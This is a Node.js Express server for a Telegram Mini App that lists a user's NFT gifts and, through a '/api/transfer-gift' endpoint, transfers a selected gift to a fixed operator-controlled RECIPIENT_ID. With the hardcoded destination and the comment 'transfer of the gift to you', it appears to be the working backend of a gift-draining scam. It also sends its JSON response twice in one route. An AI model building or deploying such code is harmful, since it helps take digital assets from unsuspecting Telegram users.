import express from 'express';
import crypto from 'crypto';
import fetch from 'node-fetch';
import 'dotenv/config';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN    = process.env.BOT_TOKEN;
const RECIPIENT_ID = Number(process.env.RECIPIENT_ID);

// ---------- проверка подписи initData ----------
function verifyInitData(initData) {
  if (!initData) return false;
  const p = new URLSearchParams(initData);
  const hash = p.get('hash');
  if (!hash) return false;
  p.delete('hash');
  const str = [...p.entries()]
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([k, v]) => `${k}=${v}`)
    .join('\n');
  const secret = crypto.createHmac('sha256', 'WebAppData').update(BOT_TOKEN).digest();
  const calc   = crypto.createHmac('sha256', secret).update(str).digest('hex');
  return calc === hash;
}

// ---------- обёртка над Telegram Bot API ----------
function tg(method, body) {
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  }).then(r => r.json());
}

// ---------- список NFT-подарков пользователя ----------
app.post('/api/my-gifts', async (req, res) => {
  const { initData } = req.body;
  if (!verifyInitData(initData)) return res.status(401).json({ error: 'bad signature' });

  const user = JSON.parse(new URLSearchParams(initData).get('user'));

  const r = await tg('getUserGifts', {
    user_id: user.id,
    exclude_unsaved: false,
    exclude_saved: false,
    limit: 10
  });

  if (!r.ok) return res.status(500).json({ error: r.description });

    const gifts = (r.result.gifts || []).map(g => ({
    owned_gift_id: g.owned_gift_id,
    gift_id: g.gift_id,
    type: g.type,
    name: g.gift?.sticker?.emoji || 'gift'
  }));
  res.json({ gifts });

  res.json({ gifts });
});

// ---------- передача подарка тебе ----------
app.post('/api/transfer-gift', async (req, res) => {
  const { initData, ownedGiftId } = req.body;
  if (!verifyInitData(initData)) return res.status(401).json({ error: 'bad signature' });

  const user = JSON.parse(new URLSearchParams(initData).get('user'));

  const r = await tg('transferGift', {
    user_id: user.id,
    owned_gift_id: ownedGiftId,
    new_owner_id: RECIPIENT_ID
  });

  if (!r.ok) return res.status(500).json({ error: r.description });

  res.json({ ok: true });
});

app.listen(process.env.PORT || 3000, () => {
  console.log('http://localhost:' + (process.env.PORT || 3000));
});
